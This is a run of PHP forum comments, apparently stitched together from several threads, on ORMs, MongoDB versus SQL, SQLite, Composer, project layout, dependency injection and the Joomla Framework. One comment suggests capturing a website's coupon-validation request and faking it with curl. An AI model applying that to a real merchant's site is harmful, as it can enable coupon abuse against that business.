The point is that I'm talking from a position of experience in large scale. The last ORM I used was Lithiums, which I'm not a fan of (lithium in general), before that Zend_Db from Zend Framework (which I left the project prior to 1.0, but still used it sometimes, because I didn't like how it was over-engineered; I love ZF2 though :) I have evaluated Propel and Doctrine, and other current solutions without them winning me over :) Which SQL are you talking about? My `INNER JOIN` vs sub-select *example*? Or the syntax *example*? As for the scaling; I mean that it's tough to notice performance issues from an ORM when you're a single developer on a fairly beefy box, compared to needing sub-second responses with high concurrency on production. Not to mention things like size of datasets (it's not uncommon for developers to work with a representative data-set, though personally I always test against a production data set at some point before I consider it complete). 
Regardless if individuals need to use it, plugins like that solve the problem, so why anyone really still complains about this is just people being pedantic and finding reasons to complain about something, rather than real problems (of which, I admit there are plenty).
It amazes me how far people are willing to go to avoid using a proper database. They start with a simple flat file, end up having to re-implement all the things the database does for them except badly.
The thing is, I will never have to use this for anything (re: "go for it"). I wrote that for your benefit, so you might avoid a few pitfalls. The issue with the way you've chosen to comment, in addition to what /u/ladytrekka/ said earlier, is it actually reduces, or at least reduced my, ability to scan the function to figure out what it does. By writing so many comments you've instead made it more difficult to understand the logic because instead of describing why you're doing something you're just literally rewriting the PHP in English. There might as well be no comments.
 func_get_args(); Yikes. Obiously this method is working for you, but why not something like: function fetchRows(string $query, array $parameters) It'd make it much more readable for others if they ever have to work on your code, and probably easier for yourself further down the line.
No offense intended, but get real! If you find yourself in the position to switch databases in production you have bigger problems than SQL queries. You chose the tools for your new application before you start writing code and in you stick more or less to that stack. If you will find yourself in the position to change something from the initial stack, in most cases that happens while you are in pre-beta stage, when you app is still under experiments maybe.
&gt; I hate preg_replace In time you will realize that it's probably the single most powerful feature of PHP (and, to be fair, it's really a feature of Perl that was linked into PHP). Anyway, your pattern is missing starting and ending delimiters. And you should typically escape curly braces with backslashen.
Someone please correct me if I am wrong here, but since this is a library, the `composer.lock` file need not be in the repository, no?
Read the docs on php.net Mongo is awesome just remember nosql is not always the answer. 
That shouldn't be the case. Remember, you need the execute bit on the directory on every parent up to root /. Unless your shared hosting is really crappy, your home directory will be restricted, so even if a sub directory had 777, because the parent is locked down it won't matter. If your home directory isn't locked down (i.e. using mod_php), you've got bigger issues.
Correct. It is recommended not to include composer.lock for libraries. http://getcomposer.org/doc/01-basic-usage.md#composer-lock-the-lock-file
All good. Thanks for the clarification there. My original topic for this post is irrelevant in that case. My misunderstanding.
No problem dude. Thanks for asking about it. :-)
I've heard this time and time again but can you give me your opinion as to why?
&gt; global $pdo; Why not make your database object a singleton class instead? That way, you're always sure you're using the database object, and not dragging the value of a variable named PDO from the global scope. Something like: function updateRow($query, array $params){ $pdo = db::get_instance(); $stmt = $pdo-&gt;prepare($query); return $stmt-&gt;execute($params); }
I'm already working on a way around this but it's definitely a major issue right now. SQLite is great and I'm a big fan but it still has a single binary file that is not portable between developers and environments and you still run into issues with migrations etc.
SQL is a really powerful way to model data. You can get performant queries along with more natural modeling of many to many relationships. The trend is NoSQL databases because a few web startups needed that scale. But SQL is an extremely reliable tool that has several advantages, which you can find if you google them. (SQL, to me, feels like a more natural way to model the data. Many-to-many relationships seem to work better. Super powerful queries. And, most of all, it's got fewer holes in reliability [changes depending on which NoSQL store you use, but the fact I'm making is that pretty much all SQL implementations put a priority on this])
Be wary of people that suggest things simply because they're the new buzzword. That doesn't mean on any level whatsoever that Mongo and/or Node don't have their place. But that's exactly what it is, a place. Use the right tool for the job.
It all depends on what you are planning to build. MongoDB, MySQL, etc., they are all just tools. Your use case should dictate the tool you use. You wouldn't use a 20lb sledge to hammer a finishing nail...
Read [Why You Should Never Use MongoDB](http://www.sarahmei.com/blog/2013/11/11/why-you-should-never-use-mongodb/) and if you still wanna go for it please do. I've used MongoDb in production PHP (doctrine) and I own a production website that uses MySQL (and some redis) and my opinion is that in general I would never use MongoDB for a production application. The only times I would use it would be the same use cases as redis, and then I would just use redis. edit: lol why downvotes?
Disclaimer: I've used MongoDB in production for 4+ years and we only just recently removed our largest replicaset from production. I went to the bar afterwards and had a grand old time with the other ops guy. If I seem mad in this post, it's because I want to save others from the wondrous life of maintaining a MongoDB cluster. Having used MongoDB at scale - well, according to 10Gen, 100GB is apparently lots of data[1] - I can honestly say it was pretty fucking worthless. For it to be fast, your entire dataset needs to fit in memory. Which is cool, except that doesn't happen in the real world ever. Maybe for a blog, but not very rarely for anything that matters. You could use it as a cache, but why? Is it because the "native" format[2] is json? If that's the case, most other caching engines work *just* fine with json, arrays, etc. Personally, I'd rather everyone use Memcached - Redis doesn't have a proper clustering solution - but as long as you are using something that was meant to be a cache, A++ would cache again. You are probably very familiar with tables, joins, group-bys, etc. If you need to perform a roll-up, this is quite trivial in any half-way decent sql implementation. You'll need to start looking at map-reduce queries in MongoDB, which are quite fun to have syntax-highlighting for. What features does it provide that you'd want to use? - Geoqueries: Use a real search engine for this, like Solr or Elasticsearch. Elasticsearch is usually ace at stuff like this. - Replication: Get a lot of data in there, have a netsplit, and then have fun when mongodb decides two nodes are master, or that it needs to resync the *entire* dataset for some/all nodes. Or that it needs to read the data from the master node in order to populate your new replicaset member, which takes down your cluster because now it cannot handle the number of network requests its getting as it needs to load up the *entire* dataset into memory. - Document-oriented Storage: This isn't even a feature. Use Postgres if you want Json. Elasticsearch also has this. - Map/reduce: Good luck writing these for *every* small feature you want to build. Thankfully the new aggregation framework helps remove the need for this, but even that isn't so great. - GridFS: Just use S3. Please. I won't talk about about the many ways in which it will lose your data. Here[3] is a great writeup by Kyle Kingsbury - @aphyr, developer of the Reimann monitoring system - on just this topic. It's not your typical "omg safe writes are off" type of post, if that's what you're going to complain about. If you think your data is not relational, then okay, it's just a data stream. I can condone this as a valid use for MongoDB, provided you don't care about data compaction on disk, locking the entire database - not just your replica, but the whole cluster - when you drop a collection, and you have enough memory for everything to be memory mapped. But I'll bet you one of my 3 macbooks that your data is indeed relational, and your only real "problem" is that you don't like making schema changes. Which is a mostly solved problem in many frameworks. Let me buy you a beer and explain to you the hundreds of reasons why you should not be using MongoDB. Here is another post[4] on the subject, which actually goes through many real-world problems you'll have with MongoDB before you switch to a real database. If you have the option to use any database, use Postgres. If you are insistent on having the fastest database for your new social network for cats, here are some benchmarks[5] between it and MongoDB. [/rant] * [1] http://blog.mongohq.com/mongodb-scaling-to-100gb-and-beyond/ * [2] It's actually BSON, which is essentially a dictionary-like datastructure. * [3] http://aphyr.com/posts/284-call-me-maybe-mongodb * [4] http://www.sarahmei.com/blog/2013/11/11/why-you-should-never-use-mongodb/ * [5] http://obartunov.livejournal.com/175235.html
If the site offers a service where it will validate a coupon code you could just fake the request using curl. The simplest way to check how it works would be to open the network panel of your browser (assuming chrome or firefox) and then submit a coupon code, see what request happens and then fake that request with your own data. For specific advice on how to do the requests you'd need to explain what knowledge of PHP you have. If you have an example coupon code and example website I'm sure someone would be willing to mock up an example for you.
Thanks! So I'd definitely appreciate if you could explain it as it I'm five. I'm relatively new to PHP but not to programming in general. Recently I've been trying to speed through learning PHP because this summer I want to be able to teach it at a tech camp and because I'm making a website (a different one) that could really be helped by some php. So, in short, I know Java, HTML, and CSS all really well, I know Javascript well but not as well. Therefore I've inherited a lot of PHP knowledge, but the only really PHP specific thing I know is submitting MySQL (which I also know a bit) queries to keep track of user generated content on a server.
This. I cannot recommend this article enough. I maintain a (currently) small project that has been using MySQL. Along the way, I began to realize 'Oh, I want to collect some analytics, and I don't want to be tied to certain types of analytics. MongoDB/NoSQL is perfect for this!' Well, after working on rewriting my API's, I began to run into problems. Coming from MySQL, I wanted a way to tie the analytics to my User collection. 'That's no big deal, I'll just reference the user's Object_Id in my Analytics collection, and I'll be good to go.' More problems. 'Oh, now I can't figure out a good, low-performance to list the number of analytics for each user without. Oh, I know, I'll just make my stats a field in the User collection rather than it's own collection, I should be able to do it that way.' A couple days later, after pondering, I stumbled across this article, and realized that if I make my stats a field of my User documents, I won't be able to individually view one stat. So now, I am getting ready to pull the trigger on PostgreSQL as my back end because of the flexibility it's JSON provides.
Seconded. I'm working on a product at my company that is pretty close to being shipped (&lt;1 month) using Meteor+Mongo and it is pretty unanimous that while Meteor is really cool we made a bad decision in choosing Mongo; it is the source of so many of our problems. For small projects or a blog or something, sure, go ahead and use Mongo. If *anything* in your dataset will be relational, if you like normalization, if there's a chance that you'll have a lot of data, if you are selling this product to a customer, etc etc etc then choose something else. SQL is tried and tested. It is fast. It is secure. It works.
You can load extensions at runtime. I've never actually used this feature of PHP and I think it is disabled by default in most SAPIs; I'm guessing if you use Phalcon you can overcome this issue. See http://php.net/manual/en/function.dl.php for some more details. 
A good ORM should provide you the ability to write your own SELECT statements and still return the result set to you in a form that's about the same as a normal result set from a single table. It may not be directly updatable, but you should also be able to write a custom UPDATE statement, etc. &gt; They feel ORMs are a performance hit. The way I look at it is that I am going to be building queries regardless, and development time is more valuable than processor time in many cases. Throwing another server at a problem is pretty cheap and very workable with PHP; it's what, less than a week worth of developer time, for sure, and it would be easy to argue that using a solid ORM could cut a week plus off development. 
&gt; the thing is most people don't change their databases. Sometimes things gotta change, man, sometimes before even 1.0 hits. Every time you have to refactor stuff relating to a DB, a good ORM will prove its worth. A bad one will prove how bad it is, though, too...
I don't understand, why do you need multiple versions of Phalcon? Is this a problem you're currently facing, or something you're anticipating?
You don't just "switch databases in production." You have absolutely no idea what kind of requirements changes your clients, management, server admins, corporate offices, etc. will demand of you in the future. Using a DBAL covers you in that respect. It also allows you to write RDBMS-agnostic code for projects that aren't proprietary. Not using one is not a cardinal sin or anything, but if you think there aren't tangible benefits to using something that the vast majority of of a community agrees on, then perhaps it's time for some introspection.
look at well known existing projects. ie [laravel](http://laravel.com/docs/quick), [symfony](http://symfony.com/doc/current/quick_tour/the_architecture.html) and [yii](http://www.yiiframework.com/wiki/155/the-directory-structure-of-the-yii-project-site/). In terms of css and js most developers i know just go with {public_dir} /css /js /img.....etc edit: added yii's directory structure.
It looks great, thank you for sharing!
[Vagrant] (http://www.vagrantup.com/) + [Puppet] (http://docs.vagrantup.com/v2/provisioning/index.html) to provision your virtual environment. You can also use Vagrant to `symlink` your host machines folders into the `/var/www` of your VirtualMachine so that you can develop from the host machine, and have the VM serve the contents like your development web server. I've an example vagrant set up on my [github](https://github.com/awesomelionel/precise64_devbox). Feel free to modify and use as you wish. 
2011? SimpleTest? French? What the hell
I don't think this question has absolutely anything to do with virtualization.
Many to many relations are just not fun in MongoDB. Not fun at all.
hi everyone. this is a very lightweight, close-to-the-bones config file loader that only supports JSON and INI files. i've been using it for a while and thought I'd share it. it can be used anywhere, and has some basic test coverage (asserts). YAML is something i'd like to add but maybe later. pull requests and feedback will be greatly appreciated and credited.
While I agree, the main fault of MongoDB is it's worthless backend. That is mostly remedied by TokuMX (www.tokutek.com). They replaced the backend with their fractal indexed, compressed datastore. So you don't need to keep the database in ram anymore. That said, I've been using TokuDB (MariaDB version), and it rocks, especially on SSD.
There's an article floating around on using mysql for NoSQL. It's totally doable to take what you've done with Mongo and covert it to sql. If you're really stuck with Mongo, your salvation might be TokuMX. I don't work for the company, nor have anything to do with them except for the fact that their datastore fucking rocks. Seriously, if you're up shit creek with Mongo, try TokuMX from tokutek.com. 
While I admire TokuMX - I have a buddy running it in production - I seriously don't think that fixes much of anything. The backend may be the same, but you still have the same api issues you'd otherwise have. You're only masking the issues with an expensive license to a product you wouldn't otherwise need if you just used a sane datastore.
The problem is that the mongodb datastore is garbage. http://www.tokutek.com/2013/06/tokumx-fractal-trees-with-mongodb/ 
If you're stuck with MongoDB, TokuMX might give you enough breathing room to switch to something like TokuDB. Though TokuMX itself has pretty interesting features: http://www.tokutek.com/2013/06/tokumx-fractal-trees-with-mongodb/ Also, what license are you talking about? Both products are free and OSS.
I gave up on mongodb 2 years ago. When it was all the rage, I installed it unto an EC2 instance and began testing. After opening about a page of bug tickets I decided it wasn't ready for prime-time. It's improved a lot, and TokuMX might be the salvation it needs. But I wouldn't use it if you have a LOT of data, although as I mentioned before, TokuMX might solve that bit...
redis?
you could check out in Github projects 
Be thankful that it only is a university project!
&gt; This function has been removed from some SAPIs in PHP 5.3. &gt;The only SAPIs that allow dl() are CLI and Embed.
You misunderstood the point and your posts contradict themselves. Trying to make your app work with multiple backends so you can cover multiple clients requirements it is OK and that is a valid point for using a db wrapper, but using it based on the statement that "_If you decide to switch from MySQL to Oracle next month_" it is not a valid point because something like that does not suppose to happen and exactly this I was trying to explain in my previous post. The idea behind my posts is not that I'm against using db wrappers, but using them "_because they allow you to switch databases at any time_". There are other valid reasons for using a wrapper, like allowing you to be more productive, you can write portable code, or any other reason.
Really...? Eclipse, of all things? Just one-line a provisioned vagrant box and use any decent IDE instead.
I use MongoDB for relational data and GridFS for storing files because I don't give a fuck.
As I understand it, APCu is being used by many, but is still considered to be a beta. For those developing projects where they might consider using Flywheel that's probably fine, but I wouldn't trust APCu in my production environment just yet (at the day job), which is one of the bigger reasons we haven't upgraded to 5.5 yet, either. 
 /src/App /src/&lt;framework folders&gt;/ /src/Vendor/ /src/Test/ /src/public/ /src/public/assets/&lt;css, js, images&gt;/ /src/public/vendor/&lt;jquery, fancybox, other css/js/etc. plugins&gt;/
I've got a question for PHP devs... Honestly, why not use SQLite? It requires no dependencies or additional installation/management, you can set up a decent ORM for it in minutes, and it'd allow you to expand should you ever need to grow.
&gt; that is not portable between developers and environments What? It's explicitly defined as being portable between devs and envs: http://www.sqlite.org/onefile.html And I've never run into "issues with migrations", especially on small projects.
The path of least resistance tells us why there aren't that many good framework agnostic packages. When you are very comfortable with a framework its easy to implement complex features and, since your module solves complex problems, a lot of users will adopt the module. This makes the module and the framework seen as "good problem solvers". Unfortunately there is no "framework agnostic library repository". Packagist should have been the place, each framework having to register for a "subdirectory" there so you can load Laravel-modules from laravel.packagist.org or something.
This article (or something like it) should really be linked from the packagist submit page
The preg engine should barf on that regexp. Still needs delims :)
JSON is not suitable as a configuration file format. From first-hand experience I've learned that the lack of comments and its syntax make it a bad choice for this goal. Fellow developers, let us please stop being lazy for our own sakes and refrain from using JSON as anything other than what it was intended for: data serialization.
 /src/{app} /www/assets/{js,css,etc} /vendor
I think your example is bad, even though of course the principle is not. The reason for this is your example uses model classes. And sometimes, this: class Product { public function __construct($stockQuantity, $stockStatus) { $this-&gt;stockItem = new StockItem($stockQuantity, $stockStatus); } // ... is preferable to this: class Product { public function __construct(StockItem $stockItem) { $this-&gt;stockItem = $stockItem; } // ... For example, in Domain Driven Design, Product might be a root aggregate, and StockItem an object of that aggregate. And you'll want to encapsulate the internals of Product to its user, so you don't want the user to create StockItem objects. Your example would have been better using services for example.
Haha, nice. Do you need even need the ability to return a function? Normally if there is logic required I put it right in the file that returns the PHP array.
I like to keep my PHP code outside of the public root directory as well.
1. Namespaces allow you to name your libraries according to their use. `Vendor\Package\Subpackage` is the thumb-rule so better use `Vlad\Validation` as the name of the lib 2. Add tests 3. Add composer file ZF2 InputFilter does what your lib does. Not necessarily a good thing :)
Few days ago I've made a small library using dependency injection to get description about a website, so you can check it for real/bigger example here https://github.com/kasp3r/link-preview
front-ed stuff should go in the document root. the rest somewhere else imho
Thank you, 2. Not rushing to add the tests until I have some feedback about the syntax. It might require extensive rewriting. 3. Similar to the above. Not encouraging people to actually use it yet. Just looking for feedback. What would make you prefer ZF2? (apart from the well-established/tested argument)
I'm a HUGE fan of SQLite for this very reason. Most of my smaller website projects use it. It simplifies the web hosting requirements (no database setup or credentials to deal with), and yet I still get most of the basic functionality that a bull blown database gives. Totally awesome.
As /u/mnapoli mentions, your example doesn't really do your point justice. You're examples shows you factoring out StockItem from Product, which is good - but not a dependency, just another variable that Product contains. A dependency would be like a Response object, or a SQL object, or something it depends on, not just something it contains. What your example does is essentially the same as refactoring a $date and a $time variables from creating a DateTime object to simply accepting a DateTime object.
I love just about everything from Igor. He does a great job explaining things and makes it clear enough for most anyone to understand.
While DI itself is certainly not *"new in the PHP world"* it is not off-base to say that Laravel is a poor example of it's use. [Laravel facades](http://laravel.com/docs/facades) are the perfect example of the service locator anti-pattern (not dependency injection).
To everyone that has commented on the article so far Thank You! I really appreciate the feedback and calling me out if I'm wrong, It helps me to become a better writer and improve the quality of the content. Keep it coming.
I would go one step further and just do the logic in your config setting itself. Meaning if you have to do advanced processing to get a config value, you might be doing something wrong. &lt;?php return [ 'debug' =&gt; (getenv('SERVER_ENV') !== 'production') ]; 
What is shit? The CMS? I agree it's architecture is lacking. But you should really check out the Framework. Otherwise, you're letting old prejudices rule current decisions, and that's pretty closed-minded.
More healthy competition from long standing players in the game? I thought so too!
You're referring to the CMS. This post is about the modernized, namespaced PHP 5.3+ Joomla Framework.
Joomla the CMS is a great product, proven by the fact that it powers 3.8% of the web in recent reports. But this is referring to the Joomla Framework, not the CMS.
Joomla does love football and beer!
i didn't find better even in English tat explain how to set properly php project on eclipse 
Popularity is a bad measurement for how good a product is.
Well, while you (just you) use the code you write, I'll be busy contributing to good code that effects 3.8% of the web. :)
My posts don't contradict each other; you just misunderstood one of them. Applications don't just change databases on the fly - this is what I meant the second time around, as that's what I thought you were getting at. But, *yes*, switching from one database vendor to another for the same application/client *does* happen, just like I insinuated with my first comment. I've been part of two such migrations in my career. Saying that it's "not supposed to happen" is naive, and means nothing. Your bosses and clients don't give a flip what you think "is supposed to happen" if switching from Oracle to Postgres is going to save them $$$$$.
An ill try at writing crappy SEO content... Do really think you can trick Google with this at the start of 2014? LOL 
Thanks for the reply, Don! :-)
&gt; Recently, there was a bit of a debate on Twitter about the value of framework agnostic packages vs. the effort required to build them. I'm not sure how anyone could legitimately argue against loose-coupling. Anything else is just bad design. Nice article! +1
Why bother when there are already some great, well established php frameworks out there? No thanks. 
I would rather see work put in to https://github.com/lstrojny/functional-php to make it lazy than another project competing. Functional PHP is robust and has a C implementation. Adding lazy would make it that much better.
Author here. I'm aware of functional-php, and have used it in the past. The C implementation is great until it's not. The problem is that you need to find a C programmer willing to write the lazy implementation. And that's one of the reasons why it has not happened yet. That's the reason why I am promoting nikic/iter over it.
Why use two interfaces instead of one?
Damn I can't +1 that enough
Implementing iterators in C is a huge pita, especially if that iterator needs to traverse another iterator/array. Absolutely not worth the minor performance improvement it would bring.